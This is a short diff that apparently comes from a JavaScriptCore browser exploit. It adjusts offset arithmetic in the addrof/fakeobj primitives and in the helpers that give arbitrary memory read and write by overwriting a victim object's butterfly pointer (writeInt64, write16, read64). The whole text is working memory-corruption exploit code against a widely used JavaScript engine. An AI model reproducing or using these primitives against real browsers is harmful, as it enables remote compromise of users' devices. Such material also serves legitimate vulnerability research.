@@ -555,7 +555,7 @@ var VM_PROT_EXECUTE = 0x4
     var containerAddr = addrof(container);
     print(`[+] container @ ${containerAddr}`);
     // add the offset to let compiler recognize fake structure
-    var hax = fakeobj(Add(containerAddr, 0x10));
+    var hax = fakeobj(Add(containerAddr, new Int64(0x10)));
     // origButterfly is now based on the offset of **victim** 
     // because it becomes the new butterfly pointer
     // and hax[1] === victim.pointer
@@ -567,14 +567,14 @@ var VM_PROT_EXECUTE = 0x4
 
         // Write an int64 to the given address.
         writeInt64(addr, int64) {
-            hax[1] = Add(addr, 0x10).asDouble();
+            hax[1] = Add(addr, new Int64(0x10)).asDouble();
             victim.pointer = int64.asJSValue();
         },
 
         // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
         write16(addr, value) {
             // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, 0x10).asDouble();
+            hax[1] = Add(addr, new Int64(0x10)).asDouble();
             victim.pointer = value;
         },
 
@@ -593,7 +593,7 @@ var VM_PROT_EXECUTE = 0x4
         // Read a 64 bit value. Only works for bit patterns that don't represent NaN.
         read64(addr) {
             // Set butterfly of victim object and dereference.
-            hax[1] = Add(addr, 0x10).asDouble();
+            hax[1] = Add(addr, new Int64(0x10)).asDouble();
             return this.addrof(victim.pointer);
         },
         read: function(addr, length) {
